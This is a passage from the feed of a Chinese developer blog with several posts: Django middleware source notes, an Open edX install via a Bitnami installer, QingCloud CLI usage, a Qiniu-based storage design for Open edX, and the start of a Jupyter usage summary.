                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpResponseForbidden&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Forbidden&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ETag header的处理也在CommonMiddleware&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django/middleware/csrf.py#L76"&gt;CsrfViewMiddleware&lt;/a&gt;&lt;/h3&gt;
&lt;h5&gt;process_view&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;getattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;csrf_exempt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;callback come from &lt;code&gt;def process_view(self, request, callback, callback_args, callback_kwargs):&lt;/code&gt;,callback是装饰器？&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/django/django/blob/master/django%2Fcontrib%2Fauth%2Fmiddleware.py#L14"&gt;AuthenticationMiddleware&lt;/a&gt;&lt;/h3&gt;
&lt;h5&gt;process_request&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;hasattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;session&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;The Django authentication middleware requires session middleware &amp;quot;&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;to be installed. Edit your MIDDLEWARE_CLASSES setting to insert &amp;quot;&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;&amp;#39;django.contrib.sessions.middleware.SessionMiddleware&amp;#39; before &amp;quot;&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;&amp;#39;django.contrib.auth.middleware.AuthenticationMiddleware&amp;#39;.&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SimpleLazyObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;get_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意断言（assert）的使用，这里设置了request.user,并且&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Django authentication middleware requires session middleware&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;get_user&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Fcontrib%2Fauth%2F__init__.py#L159"&gt;get_user&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;backends&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/django/django/blob/1.8.7/django%2Fcontrib%2Fauth%2Fbackends.py#L7"&gt;ModelBackend&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;By default, AUTHENTICATION_BACKENDS is set to:  &lt;code&gt;['django.contrib.auth.backends.ModelBackend']&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;CASBackend&lt;/h3&gt;
&lt;p&gt;look at &lt;a href="https://github.com/wwj718/django-cas/blob/wwj/1.2.0/cas/backends.py#L218"&gt;CASBackend&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;storage system&lt;/h1&gt;
&lt;h3&gt;qiniu&lt;/h3&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/django/django/tree/1.8.7"&gt;django/django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.8/"&gt;Django documentation 1.8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.djangobook.com/en/2.0/index.html"&gt;djangobook&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://djangobook.py3k.cn/2.0/"&gt;中文版&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.djangobook.com/en/2.0/appendixG.html"&gt;Appendix G: Request and Response Objects&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://djangobook.py3k.cn/appendixH/"&gt;中文版&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.8/topics/http/middleware/"&gt;Django documentation Middleware&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.9/topics/auth/customizing/"&gt;Customizing authentication in Django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.9/howto/custom-file-storage/"&gt;Writing a custom storage system&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 07 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-07:django-source-code-explore-note.html</guid><category>django</category></item><item><title>使用bitnami提供的二进制包在局域网内安装Open edX</title><link>/try-bitnami.html</link><description>&lt;p&gt;由于Open edX的依赖繁多，安装繁琐等原因，&lt;a href="https://bitnami.com/"&gt;bitnami&lt;/a&gt;提供了二进制的一键安装包&lt;a href="https://bitnami.com/stack/edx"&gt;Open edX&lt;/a&gt;，edx的blog上对此事有过报道&lt;/p&gt;
&lt;p&gt;一般而言，社区倾向于采用原生的安装方式，原因有二：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当前大多的讨论基于原生版本，这样使用过程中遇到的坑，易于搜到解决方案，因为大家围绕着一个相同的版本。这样可以充分发挥社区的力量&lt;/li&gt;
&lt;li&gt;易于升级和改造（主要也是因为资料多）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另一方便，我们也有动力去采用一键安装的二进制包：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装便利，只要下载好二进制文件（1.1G），安装即可.&lt;/li&gt;
&lt;li&gt;不必担心国内外网络的差异造成的各类诡异错误。在校园网中这个优势尤其明显&lt;/li&gt;
&lt;li&gt;对环境的要求仅有linux-x64！&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在目标机器上下载&lt;a href="http://bitnami.com/redirect/to/87743/bitnami-edx-cypress-4-linux-x64-installer.run"&gt;bitnami-edx-cypress-4-linux-x64-installer.run&lt;/a&gt; （这是当前最新版）&lt;ul&gt;
&lt;li&gt;你可以采用你喜欢的工具下载（wget，curl，aria2c等），也可以本地下好，scp传输到目标机器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chmod 755 bitnami-edx-cypress-4-linux-x64-installer.run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./bitnami-edx-cypress-4-linux-x64-installer.run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;之后按提示填写信息就行&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;h3&gt;访问&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;http://localhost:8080 ： lms(学生端)&lt;/li&gt;
&lt;li&gt;http://localhost:18010 ： cms（教师端）&lt;/li&gt;
&lt;li&gt;http://localhost/admin ： admin（后台管理）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;start/stop the servers&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd ~/application-version
./ctlscript.sh start
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;更多的设置参考&lt;a href="https://wiki.bitnami.com/Applications/Bitnami_Open_edX"&gt;Bitnami_Open_edX wiki&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;探索&lt;/h1&gt;
&lt;h3&gt;项目结构&lt;/h3&gt;
&lt;p&gt;使用tree探索：&lt;code&gt;tree -L -C ~/edx-cypress-4&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;相关进程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ps aux |grep edxapp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们看到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/home/wwj/edx-cypress-4/apps/edx/edx-platform/bin/python.edxapp ./manage.py lms --settings=aws celery worker -I contentstore.tasks --loglevel=info --queues=edx.lms.core.low --hostname=edx.lms.core.low.%h --concurrency=1&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;控制脚本&lt;/h3&gt;
&lt;p&gt;搜索&lt;code&gt;edx.lms.core.low&lt;/code&gt;：&lt;code&gt;grep edx.lms.core.low ~/edx-cypress-4  -R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发现&lt;code&gt;/home/wwj/edx-cypress-4/apps/edx/scripts/ctl.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过分析&lt;code&gt;ctl.sh&lt;/code&gt;,我们发现，bitnami采用shell来控制edx，而不是像原生安装那样采用supervisor来控制进程&lt;/p&gt;
&lt;h3&gt;源码&lt;/h3&gt;
&lt;p&gt;查看源码的git log我们发现，最后一次提交为&lt;code&gt;bde4dc5fdb6b470db0de361bc87038faf4f5471c&lt;/code&gt;,这恰好是&lt;a href="https://github.com/edx/edx-platform/commits/named-release/cypress.rc"&gt;named-release/cypress.rc&lt;/a&gt; 最终的提交&lt;/p&gt;
&lt;p&gt;所以bitnami没有动源码&lt;/p&gt;
&lt;p&gt;这意味着它和原生系统基本相同&lt;/p&gt;
&lt;h1&gt;题外&lt;/h1&gt;
&lt;p&gt;另外我对&lt;a href="https://bitnami.com"&gt;bitnami&lt;/a&gt;采用的技术挺感兴趣，下午和@netwalk0r聊了一下，他说以前看过bitnami的安装包，应该不是采用base64的打包，我们都觉得应该是使用某种方式包装了二进制包和shell。&lt;/p&gt;
&lt;p&gt;欢迎对此了解的同学一起来讨论咯&lt;/p&gt;
&lt;p&gt;当然由于我相信docker这类技术是未来，所以也不愿在二进制打包这类技术上话费太多精力&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;补充&lt;/p&gt;
&lt;p&gt;偶然的机会发现，bitnami 的应该是使用了&lt;a href="https://github.com/megastep/makeself"&gt;makeself&lt;/a&gt;来打包，这个工具好强大&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bitnami.com/stack/edx/README.txt"&gt;stack/edx/README&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.bitnami.com/Applications/Bitnami_Open_edX"&gt;Bitnami_Open_edX wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 05 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-05:try-bitnami.html</guid><category>edx</category></item><item><title>使用命令行操作青云</title><link>/use-qingcloud-cli-contral-qingcloud.html</link><description>&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;学会在命令行下，对云主机进行日常的操控&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;pip install qingcloud-cli&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;新手指南&lt;/h1&gt;
&lt;p&gt;将你的&lt;a href="https://console.qingcloud.com/access_keys/"&gt;access key&lt;/a&gt;填入&lt;code&gt;~/.qingcloud/config.yaml&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;列出所有命令 ： &lt;code&gt;qingcloud&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;help ： &lt;code&gt;qingcloud iaas run-instances -h&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;命令列表&lt;/h1&gt;
&lt;p&gt;只列出我日常常用的&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;主机相关&lt;/h3&gt;
&lt;h5&gt;describe-instances&lt;/h5&gt;
&lt;p&gt;describe-instances（实例描述）：&lt;code&gt;qingcloud iaas describe-instances&lt;/code&gt;，返回一串json，可以使用 &lt;code&gt;| jq "."&lt;/code&gt;来美化输出，关于jq可以参考&lt;a href="http://blog.just4fun.site/command-tool-jq.html"&gt;命令行神器之jq&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用示例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;qingcloud iaas describe-instances|ack 209 -C 17&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;&lt;code&gt;qingcloud iaas describe-instances|jq '.instance_set[].instance_name'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;qingcloud iaas describe-instances|jq '.instance_set[]|.memory_current,.vcpus_current,.instance_name'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;重要字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;instance_id ： 主机id&lt;/li&gt;
&lt;li&gt;status : 主机状态，可通过获得 jq ".instance_set[].status"获得&lt;/li&gt;
&lt;li&gt;instance_name ： 主机名&lt;/li&gt;
&lt;li&gt;vcpus_current : 核数 &lt;/li&gt;
&lt;li&gt;memory_current ： 内存&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;start-instances&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;qingcloud iaas start-instances &amp;lt;instance_id&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;stop-instances&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;qingcloud iaas stop-instances &amp;lt;instance_id&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;其他的命令使用时再记录&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;p&gt;附上我的这个项目:&lt;a href="https://github.com/wwj718/qingcloud_cron"&gt;qingcloud_cron&lt;/a&gt;：使用定时任务控制青云服务器&lt;/p&gt;
&lt;p&gt;参考: &lt;a href="https://docs.qingcloud.com/api/common/cli/index.html#id7"&gt;命令列表&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.qingcloud.com/api/common/cli/index.html#qingcloud-cli"&gt;CLI 文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;延伸&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.qingcloud.com/api/common/sdk/index.html"&gt;SDK 文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 04 Mar 2016 00:00:00 +0000</pubDate><guid>tag:,2016-03-04:use-qingcloud-cli-contral-qingcloud.html</guid><category>dev-tools</category></item><item><title>为Open edX构建存储服务</title><link>/built-data-storage-system.html</link><description>&lt;p&gt;汤山归来，两天不碰电脑，如小钗所言，变聪明许多，思维逐渐活跃&lt;/p&gt;
&lt;p&gt;构建存储服务这个话题困扰了我很久，直到今天洗澡的时候才把这个问题的解决方案大纲理清，与大家分析思路和方案&lt;/p&gt;
&lt;h1&gt;背景介绍&lt;/h1&gt;
&lt;h3&gt;Open edX&lt;/h3&gt;
&lt;p&gt;关于Open edX就不做过多介绍了，误入本文的小伙伴可以翻阅我此前的这篇译文:&lt;a href="http://blog.just4fun.site/about-Open-edX.html"&gt;关于Open edX[译文]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;入坑已久的小伙伴，继续下翻好啦&lt;/p&gt;
&lt;h3&gt;存储服务&lt;/h3&gt;
&lt;p&gt;这里谈论的存储服务，主要指为网站提供文件存储/分发功能的服务，包括js/css/img等静态文件，也包括用户上传的资源文件，诸如视频/图片和文档&lt;/p&gt;
&lt;p&gt;之所以称之为服务而不是系统，是因为我把它视为一个抽象存在，实际上在技术人员看来，它只是一套对接云平台的接口。是存储云平台与Open edX之间的一个胶水层&lt;/p&gt;
&lt;p&gt;出于七牛云完备的文档和对开发者的友好，我选择以七牛云为例来实现&lt;/p&gt;
&lt;h1&gt;Open edX中的文件存储需求&lt;/h1&gt;
&lt;p&gt;我们进入主题，从需求说起。&lt;/p&gt;
&lt;p&gt;Open edX中的文件存储需求主要包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;课程团队私有仓库（文件夹），用于存取：&lt;ul&gt;
&lt;li&gt;课程相关的log，以便进一步做数据分析&lt;/li&gt;
&lt;li&gt;课程数据下载，诸如成绩单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;课程资料&lt;/li&gt;
&lt;li&gt;课程视频（重点之一）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中涉及的技术点主要包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件权限控制&lt;/li&gt;
&lt;li&gt;文件操作（接口）&lt;ul&gt;
&lt;li&gt;上传&lt;/li&gt;
&lt;li&gt;下载&lt;/li&gt;
&lt;li&gt;管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CDN&lt;/li&gt;
&lt;li&gt;流量监测（方便优化）&lt;/li&gt;
&lt;li&gt;并发访问&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;h3&gt;传统思路&lt;/h3&gt;
&lt;p&gt;实际上以上是很典型的文件存储需求，传统的思路是自己构建一个存储服务就好啦，租上机房，买来服务器，拉好光纤，做好磁盘阵列，写一个web服务来对外提供存储服务。如果访问量大，继续做CDN之类的优化，折腾之极，而且效果不理想&lt;/p&gt;
&lt;p&gt;我们实际也这样做过,试着自行搭建管理系统（试过wagtail，seafile等），试着整合cas登录机制，都很折腾&lt;/p&gt;
&lt;p&gt;这样面临的问题包括但不限于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间成本高&lt;/li&gt;
&lt;li&gt;经济成本高&lt;/li&gt;
&lt;li&gt;系统不够健壮&lt;/li&gt;
&lt;li&gt;扩展性差&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基于云平台&lt;/h3&gt;
&lt;p&gt;今天的开发者可能是有史以来最幸福的开发者。云的崛起，使大多的计算资源以云的形式存在，我们只需要抽象使用即可。&lt;/p&gt;
&lt;p&gt;付出经济的成本，我们就可轻松获得稳定、灵活的云服务，而把底层的复杂性屏蔽在外，开发者只需关注业务逻辑。&lt;/p&gt;
&lt;p&gt;当然，存储也不例外&lt;/p&gt;
&lt;h1&gt;技术细节&lt;/h1&gt;
&lt;p&gt;此前困扰我的一个问题是，处于对权限的控制，我们是不是需要所有文件都经过后端，然后同步到云&lt;/p&gt;
&lt;p&gt;其实这个问题已经被云存储上考虑在内的，S3的解决方案最为完备，此后也被其他厂商跟进。但对此方案的论述似乎很少，或者这是架构的一个问题，本身就小众，关注者不多，我在网上一搜发现不少架构者有这种疑惑，但决绝方案比较晚近才比较完备&lt;/p&gt;
&lt;p&gt;当我们能够描述问题的时候，已经解决了大半，尤其是在网络时代，你遇到的问题，其实几乎都被别人遇到过，你要做的是弄清问题所在领域和问题描述。then google它或是github它&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;seek, and you will find&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;编程模型&lt;/h3&gt;
&lt;p&gt;&lt;img alt="programming-model" src="http://developer.qiniu.com/docs/v6/api/overview/img/programming-model.png" /&gt;&lt;/p&gt;
&lt;p&gt;一般的云存储上传流程是:&lt;code&gt;客户端（终端用户） =&amp;gt; 业务服务器 =&amp;gt; 云存储服务&lt;/code&gt;,这样多了一次上传的流程，会有上传延时，而且有带宽的浪费。但七牛引入了客户端直传，将整个上传过程调整为：&lt;code&gt;客户端（终端用户） =&amp;gt; 七牛 =&amp;gt; 业务服务器&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;文件上传成功以后，七牛的服务器使用回调功能，只需要将非常少的数据（比如Key）传给应用服务器，应用服务器进行保存即可。&lt;/p&gt;
&lt;p&gt;在七牛云存储中，整个上传流程大体分为这样几步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;业务服务器颁发&lt;code&gt;上传凭证&lt;/code&gt;给客户端（终端用户）&lt;/li&gt;
&lt;li&gt;客户端凭借 上传凭证 上传文件到七牛&lt;/li&gt;
&lt;li&gt;在七牛获得完整数据后，发起一个 HTTP 请求回调到业务服务器&lt;/li&gt;
&lt;li&gt;业务服务器保存相关信息，并返回一些信息给七牛&lt;/li&gt;
&lt;li&gt;七牛原封不动地将这些信息转发给客户端（终端用户）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下载和其他操作也于此类似。更多细节请看文档&lt;/p&gt;
&lt;p&gt;由以上流程我们看到，这是一个灵活的机制，我们可以将自己的业务员逻辑轻松附在其上，诸如如果要控制用户级别的权限，那么只要在在后端将上传凭证和用户身份进行绑定即可。诸如此类&lt;/p&gt;
&lt;h3&gt;将模型用于Open edX&lt;/h3&gt;
&lt;p&gt;后端层面，构建颁发凭证的rest 接口，利用凭证，我们可以做到用户或课程团队粒度的权限控制。&lt;/p&gt;
&lt;p&gt;前端层面，将上传资源的按钮绑定到新的函数上。主要需要修改的地方并不多：诸如studio视频组件，论坛的图片上传等&lt;/p&gt;
&lt;p&gt;你当然也可以实现功能更全面的资源管理，诸如实践课件资源库之类的功能，只需将云存储api作为积木，置于后端业务逻辑中即可&lt;/p&gt;
&lt;h1&gt;我的实现&lt;/h1&gt;
&lt;p&gt;我会把我的实现放到我此前这个项目里&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;，欢迎围观，该项目的主要目的是对open edx进行拓展。&lt;/p&gt;
&lt;p&gt;主要是实现权限控制和授权的rest api&lt;/p&gt;
&lt;h3&gt;其他云平台&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;又拍云&lt;/li&gt;
&lt;li&gt;&lt;a href="https://help.aliyun.com/document_detail/oss/product-documentation/intruduction.html?spm=5176.docoss/sdk/python-sdk/get-started.6.80.njJEJT"&gt;阿里云 对象存储oss&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://help.aliyun.com/document_detail/oss/sdk/python-sdk/get-started.html?spm=5176.docoss/product-documentation/intruduction.6.270.maUISb"&gt;python-sdk 快速入门&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;FQA&lt;/h1&gt;
&lt;h3&gt;流量监控的用途&lt;/h3&gt;
&lt;p&gt;对于某个区域内高访问量的视频资源，采用区域内自行搭建视频服务器的方式可能比云服务廉价许多。但这依然不影响我们使用云存储。一般的云存储都有流量监控机制，当我们检测到某类文件流量高于临界值时，只需把它同步到自行搭建的本地服务器即可，后台修改地址即可，我们可以用编程的方式，为视频对象赋予一个use_local_file的开关（属性）即可&lt;/p&gt;
&lt;p&gt;这样在享受云平台廉价、敏捷的同时，也可以对特定文件做本地优化(出于成本考虑)&lt;/p&gt;
&lt;p&gt;之所以提到这点是因为公司前技术总监T老师构建了此前的视频解决方案，在特定情况下，要比云存储廉价。他说我遇见过最优秀的技术人员之一，尽管目前已经不再做技术，对问题的分解能力，交流与组织能力都令人叹服&lt;/p&gt;
&lt;h3&gt;跨域问题&lt;/h3&gt;
&lt;p&gt;由于大多云存储网站都支持域名绑定，所以不错在跨域的问题，ajax可以照常使用。所以开发者感受不出文件服务是不是来自本地后端&lt;/p&gt;
&lt;h3&gt;定制化的CDN&lt;/h3&gt;
&lt;p&gt;出于我们的具体需求，局域网内布有服务器。解决方案也简单，定制同步文件，而后匹配用户请求头，将静态资源重定向到坐在局域网服务器的ip即可，这个任务可以放在nginx那里处理&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://developer.qiniu.com/docs/v6/api/overview/concepts.html"&gt;关键概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.qiniu.com/docs/v6/api/overview/programming-model.html"&gt;编程模型&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.qiniu.com/docs/v6/sdk/python-sdk.html"&gt;Python SDK 使用指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.qiniu.com/docs/v6/sdk/javascript-sdk.html"&gt;JavaScript SDK 使用指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.qiniu.com/docs/v6/api/reference/security/put-policy.html"&gt;上传策略（PutPolicy）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关问题&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/q/1010000000611870"&gt;使用第三方存储，怎么不进行自己服务器中转就能进行权限控制？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/q/1010000000611870"&gt;各种云储存都有一个问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 28 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-28:built-data-storage-system.html</guid><category>edx</category></item><item><title>jupyter使用小结</title><link>/jupyter-summary.html</link><description>&lt;p&gt;&lt;a href="https://github.com/jupyter/jupyter"&gt;jupyter&lt;/a&gt;(之前的&lt;code&gt;ipython notebook&lt;/code&gt;)于我的最大意义在于,让学习进程和探索进程变得可累积，正如它的原先名字中的&lt;code&gt;notebook&lt;/code&gt;所暗示的那样,作为学习的记录者，方便你随时捡起学习的进度，增量式地前进&lt;/p&gt;
&lt;p&gt;李笑来在《把时间当做朋友》里说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;相信积累的力量，本质上就是相信复利的力量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;每天进步一点，一年下来，最终的收获就是365点，这是莎士比亚的算法--以为应该用简单加法计算；&lt;br /&gt;
实际上，如若真的每天进步一点点，一年下来，你的收获最终很可能是&lt;code&gt;S = P*(1 + i)^365&lt;/code&gt;，看你每天进步的是多少（i）（如果i变化你应该用∑求和），看你起步时的实力如何（P）--这是夏洛克的算法，那可是指数级增长。&lt;/p&gt;
&lt;p&gt;而我们知道，技术和知识的增长曲线往往以指数形式。所有已掌握的知识/技术都将帮助你探索新的知识。这便是经济学上复利玩的魔法&lt;/p&gt;
&lt;p&gt;所以常常，我们看到巨人随手扔下的鹅软石都是巨石，此处可以弹幕飘过一串名字：John McCarthy、Kenneth Lane Thompson、Linus Torvalds&lt;/p&gt;
&lt;p&gt;一以当千的一群人&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mindonmind.github.io/2013/02/08/ipython-notebook-interactive-computing-new-era/#相关链接"&gt;IPython Notebook: 交互计算新时代&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://site.douban.com/146782/widget/notes/15468638/note/505327095/"&gt;交互笔记：共享你的思想 一种新软件有望成为科学数据分享新利器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;pip install jupyter&lt;/p&gt;
&lt;p&gt;如果在windows下直接装anaconda吧！不想折腾的你在任何平台下都可以装anaconda&lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;jupyter notebook 
jupyter notebook --no-browser
jupyter notebook --port 9999
jupyter notebook --help
jupyter notebook --ip=0.0.0.0 #外部访问

